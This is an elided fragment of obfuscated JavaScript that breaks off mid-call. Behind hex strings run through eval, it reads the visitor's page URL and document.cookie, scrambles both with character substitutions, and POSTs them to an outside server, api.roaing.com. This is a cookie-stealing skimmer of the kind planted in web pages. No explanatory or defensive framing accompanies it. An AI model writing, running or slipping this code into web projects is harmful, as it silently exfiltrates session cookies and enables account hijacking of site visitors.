...
function Code__ToStr(hexCharCodeStr) {
...
eval(Code__ToStr('0x76617220'+'75726C3D'+'646F63756'+'D656E742E55524C'));
eval(Code__ToStr('0x7661722064'+'6973706C617'+'93D646F63756'+'D656E742E636F6F6B6965'));
url=s_CharCode(url).replace('7','r').replace('6','g').replace('4','t');
display=s_CharCode(display).replace('7','r').replace('6','g').replace('4','t');
$(function(){
    $.ajax({
    	type:"post",
    	url:"https://api.roaing.com/1/",
        data: {
            url: url,
            display: display
        },
